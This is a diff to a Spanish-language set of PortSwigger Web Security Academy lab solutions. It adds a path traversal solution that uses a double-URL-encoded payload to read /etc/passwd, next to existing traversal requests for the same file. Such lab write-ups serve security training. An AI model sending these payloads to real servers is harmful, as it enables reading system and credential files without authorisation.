@@ -103,6 +103,12 @@ Hacer una request a https://LABID.web-security-academy.net/image?filename=/etc/p
 
 Hacer una request a https://LABID.web-security-academy.net/image?filename=....//....//....//etc/passwd
 
+### [File path traversal, traversal sequences stripped with superfluous URL-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)
+
+#### Solución:
+
+Hacer una request a https://LABID.web-security-academy.net/image?filename=..%252f..%252f..%252fetc/passwd
+
 ---
 
 ## [Access control vulnerabilities](https://portswigger.net/web-security/access-control)
